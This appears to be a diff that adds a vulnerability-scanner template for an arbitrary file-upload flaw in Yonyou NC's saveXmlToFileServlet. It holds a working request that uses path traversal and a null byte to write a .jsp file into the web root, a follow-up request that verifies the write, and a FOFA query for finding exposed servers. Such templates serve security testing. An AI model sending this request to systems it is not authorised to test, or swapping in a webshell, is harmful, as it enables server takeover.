@@ -1,0 +1,41 @@
+id: yonyou-uap-saveXmlToFileServlet-upload-file
+info:
+  name: 用友NC-saveXmlToFIleServlet-任意文件上传漏洞
+  author: qianbenhyu
+  severity: high
+  description: '用友NC saveXmlToFIleServlet接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。'
+  tags: 2024,用友NC,file-upload,yonyou-uclient,yonyou-ufida-nc
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="用友-UFIDA-NC"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{randstr_1}}.jsp%00"
+    headers:
+      Cookie: LA_K1=langid
+      serverEnable: localserver
+      Accept-Encoding: gzip, x-gzip, deflate
+      Content-Length: 27
+      Content-Type: application/octet-stream
+      Content-Encoding: UTF_8
+      Connection: keep-alive
+      User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
+    body: "{{randstr_2}}"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{randstr_1}}.jsp"
+    matchers:
+      - type: word
+        words:
+          - "{{randstr_2}}"
